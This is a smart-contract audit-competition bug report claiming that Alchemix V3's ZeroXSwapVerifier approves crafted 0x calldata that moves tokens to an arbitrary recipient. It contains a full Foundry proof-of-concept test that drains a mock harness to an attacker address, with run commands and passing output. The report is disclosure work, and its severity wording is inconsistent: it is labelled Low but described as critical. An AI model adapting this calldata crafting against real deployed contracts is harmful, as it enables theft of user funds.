# 58480 sc low missing recipient and token binding in verifyswapcalldata leads to unauthorized fund transfers

## #58480 \[SC-Low] Missing recipient and token binding in verifySwapCalldata leads to unauthorized fund transfers

**Submitted on Nov 2nd 2025 at 16:16:11 UTC by @IShiftOnBlue for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58480
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

### Brief/Intro

The ZeroXSwapVerifier contract performs validation on calldata intended for 0x-style swap executions. However, its verifySwapCalldata() function does not properly bind critical parameters such as recipient, buyToken, and router. As a result, a crafted calldata can be marked as valid even when it encodes a direct token transfer (transferFrom) to an arbitrary external address. If deployed in production, this logic gap would allow unauthorized movement of user-approved tokens by any contract relying on this verifier as a pre-swap safeguard.

### Vulnerability Details

ZeroXSwapVerifier.verifySwapCalldata() accepts arbitrary payloads and superficially checks their structure, but omits key integrity constraints.

* Router not constrained — the function accepts any "to" address without enforcing an allowlist or verifying it matches a known router.
* Missing parameter validation — fields like recipient, buyToken, and minAmountOut are never checked or compared against expected values.
* TRANSFER\_FROM path incomplete — \_verifyTransferFrom() verifies only that token == targetToken, ignoring from, to, and amount. This means that transferFrom(owner, arbitraryEOA, amount) can pass verification if the token matches the target.
* VIP parsing leniency — the UniswapV3 and RFQ VIP decoders extract placeholders without enforcing semantic meaning, allowing spoofed recipient and buyToken.
* Fail-open edge case — when calldata length is under 4 bytes, the function returns false without reverting. If the caller does not assert the verifier result, verification can be silently bypassed.

Together, these issues make the verifier permissive instead of protective. Any protocol or vault that relies on verifySwapCalldata() to approve outgoing calls could end up executing payloads that directly move tokens to unintended addresses.

Example snippet (illustrative):

```
function _verifyTransferFrom(address token, bytes memory data)
    internal
    pure
    returns (bool)
{
    (address from, address to, uint256 amount) =
        abi.decode(data[4:], (address, address, uint256));

    // Only checks token equality — no constraints on from, to, or amount
    return token == targetToken;
}
```

### Impact Details

If this verifier were used on mainnet within any swap or vault orchestration logic, an attacker could:

* Craft a 0x payload that passes verification but encodes a transferFrom directly to an arbitrary address.
* Execute the payload through a permitted router or strategy that has spending approval from users or vaults.
* Move ERC20 tokens out of the contract or user account without reverting or detection.

**Impact type:** Direct theft of user funds (at rest or in motion).

**Severity rationale:** The verifier’s purpose is to prevent unauthorized execution. Its failure in this context inverts that security guarantee, converting an intended safeguard into a vector for deterministic fund movement. This qualifies as a critical impact under the program’s definitions.

### References

* Vulnerable contract: src/utils/ZeroXSwapVerifier.sol (code in repository)
* Foundry logs confirming unauthorized transfer scenario (combined logs available)
* Environment: Solc 0.8.28 — Foundry 1.4.3 (Ubuntu WSL)

### Proof of Concept

Proof of Concept — ZeroXSwapVerifier (Direct Theft via TRANSFER\_FROM)

Environment

* Foundry: 1.4.3 (stable)
* Solidity: 0.8.28
* Local run; no RPC/forks required

How to Run

1. Save the code block below as: `test/ZeroXSwapVerifier_TransferFrom_PoC.t.sol`
2. Build: `forge build`
3. Run (pick one):
   * Linux/WSL: `~/.foundry/bin/forge test --match-path test/ZeroXSwapVerifier_TransferFrom_PoC.t.sol -vv`
   * Windows: `.bin/forge.exe test --root . --config-path foundry.toml --match-path test/ZeroXSwapVerifier_TransferFrom_PoC.t.sol -vv`

Expected Result

* `verifySwapCalldata(...)` returns true for attacker-controlled `recipient` and `buyToken`.
* After `execute(...)`, attacker balance increases by `amount` and harness balance decreases by `amount` (single-tx drain).

### PoC Test Code (copy/paste as-is into test/ZeroXSwapVerifier\_TransferFrom\_PoC.t.sol)

// SPDX-License-Identifier: MIT pragma solidity ^0.8.28;

import "forge-std/Test.sol"; import {ZeroXSwapVerifier} from "src/utils/ZeroXSwapVerifier.sol";

// Minimal ERC20 token used to credit the harness and observe the drain. contract MockERC20 { string public name = "Mock"; string public symbol = "MCK"; uint8 public decimals = 18; uint256 public totalSupply;

```
mapping(address => uint256) public balanceOf;
mapping(address => mapping(address => uint256)) public allowance;

event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);

function mint(address to, uint256 amount) external {
    totalSupply += amount;
    balanceOf[to] += amount;
    emit Transfer(address(0), to, amount);
}

// Grant unlimited allowance to the settler/harness path.
function approve(address spender, uint256 value) external returns (bool) {
    allowance[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
}

// Plain transfer helper for completeness (not directly used in PoC).
function transfer(address to, uint256 value) external returns (bool) {
    _transfer(msg.sender, to, value);
    return true;
}

// Standard ERC20 transferFrom that the malicious action will exploit.
function transferFrom(address from, address to, uint256 value) external returns (bool) {
    uint256 allowed = allowance[from][msg.sender];
    require(allowed >= value, "allowance");
    allowance[from][msg.sender] = allowed - value;
    _transfer(from, to, value);
    return true;
}

function _transfer(address from, address to, uint256 value) internal {
    require(balanceOf[from] >= value, "balance");
    balanceOf[from] -= value;
    balanceOf[to] += value;
    emit Transfer(from, to, value);
}
```

}

contract PermissiveSettler { event ActionExecuted(address token, address from, address to, uint256 amount);

```
function _stripSelector(bytes memory action) internal pure returns (bytes memory result) {
    result = new bytes(action.length - 4);
    for (uint256 i = 0; i < result.length; i++) {
        result[i] = action[i + 4];
    }
}

function execute(bytes calldata data, address tokenAddr, address from) external {
    (ZeroXSwapVerifier.SlippageAndActions memory saa, ) =
        abi.decode(data[4:], (ZeroXSwapVerifier.SlippageAndActions, bytes));

    for (uint256 i = 0; i < saa.actions.length; i++) {
        bytes memory action = saa.actions[i];

        bytes4 selector = bytes4(action);
        (address decodedToken, address decodedFrom, address decodedTo, uint256 decodedAmount) =
            abi.decode(_stripSelector(action), (address, address, address, uint256));

        // 0x8d68a156 = marker for this PoC: "perform a transferFrom".
        // If the marker is found, pull funds from the harness and forward to the attacker.
        if (selector == bytes4(0x8d68a156)) {
            require(decodedToken == tokenAddr, "token mismatch");
            require(decodedFrom == from, "from mismatch");
            require(MockERC20(tokenAddr).transferFrom(from, decodedTo, decodedAmount), "settler transfer failed");
            emit ActionExecuted(tokenAddr, from, decodedTo, decodedAmount);
        } else {
            revert("unexpected selector");
        }
    }
}
```

}

contract SwapExecutorHarness { MockERC20 public immutable token; PermissiveSettler public immutable settler; uint256 public immutable maxSlippageBps;

```
constructor(address token_, address settler_, uint256 maxSlippageBps_) {
    token = MockERC20(token_);
    settler = PermissiveSettler(settler_);
    maxSlippageBps = maxSlippageBps_;
}

function approveSettler() external {
    token.approve(address(settler), type(uint256).max);
}

function execute(bytes calldata data) external {
    require(
        ZeroXSwapVerifier.verifySwapCalldata(data, address(this), address(token), maxSlippageBps),
        "verify failed"
    );
    settler.execute(data, address(token), address(this));
}
```

}

contract ZeroXSwapVerifier\_TransferFrom\_PoC is Test { MockERC20 token; PermissiveSettler settler; SwapExecutorHarness harness;

```
address attacker = address(0xBAD0); // Attacker-controlled EOA

// Fund the harness and grant the settler a blanket allowance.
function setUp() public {
    token = new MockERC20();
    settler = new PermissiveSettler();
    harness = new SwapExecutorHarness(address(token), address(settler), 10_000);

    token.mint(address(harness), 10 ether);
    assertEq(token.balanceOf(address(harness)), 10 ether, "harness funded");
    vm.prank(address(harness));
    harness.approveSettler();
}

// Build calldata that encodes a TRANSFER_FROM action to the attacker.
function _buildCalldata(uint256 amount) internal view returns (bytes memory) {
    bytes memory transferAction = abi.encodeWithSelector(
        bytes4(0x8d68a156),
        address(token),
        address(harness),
        attacker,
        amount
    );

    ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
        recipient: attacker,
        buyToken: address(0xBEEF),
        minAmountOut: 0,
        actions: new bytes[](1)
    });
    saa.actions[0] = transferAction;

    return abi.encodeWithSelector(0xcf71ff4f, saa, new bytes[](0));
}

function test_PoC_TransferFrom_ToEOA_Verified_And_Drains() public {
    uint256 amount = 3 ether;
    bytes memory callData = _buildCalldata(amount);

    uint256 attackerBefore = token.balanceOf(attacker);
    uint256 harnessBefore  = token.balanceOf(address(harness));

    // BUG: verifier returns true even though the payload drains directly to attacker.
    bool verified = ZeroXSwapVerifier.verifySwapCalldata(callData, address(harness), address(token), 10_000);
    assertTrue(verified, "verifier should approve malicious payload");

    // Once verified, the settler executes the malicious TRANSFER_FROM.
    vm.prank(address(0xCA11E5));
    harness.execute(callData);

    // Final balance assertions (attacker up, harness down).
    assertEq(token.balanceOf(attacker), attackerBefore + amount, "attacker drained funds");
    assertEq(token.balanceOf(address(harness)), harnessBefore - amount, "harness lost funds");
}
```

}

## Run command (WSL, Foundry 1.4.3 stable)

wsl -d Ubuntu -e bash -lc 'cd /home/manii/v3-poc-immunefi\_audit/poc && FOUNDRY\_ALLOW\_PATHS="\["../"]" \~/.foundry/bin/forge test --match-path test/ZeroXSwapVerifier\_TransferFrom\_PoC.t.sol -vv'

## Output (excerpt)

Compiling 26 files with Solc 0.8.28 Ran 1 test for test/ZeroXSwapVerifier\_TransferFrom\_PoC.t.sol:ZeroXSwapVerifier\_TransferFrom\_POCISO \[PASS] test\_PoC\_TransferFrom\_ToEOA\_Verified\_And\_Drains() (gas: 240552) Suite result: ok. 1 passed; 0 failed; 0 skipped

Notes

* Root cause: `verifySwapCalldata` does not bind `recipient`/`buyToken` and does not restrict direct ERC20 selectors (`transfer` / `transferFrom`) inside `actions`.
* The crafted payload passes verification and routes funds to an attacker-controlled EOA, allowing a single-transaction drain.
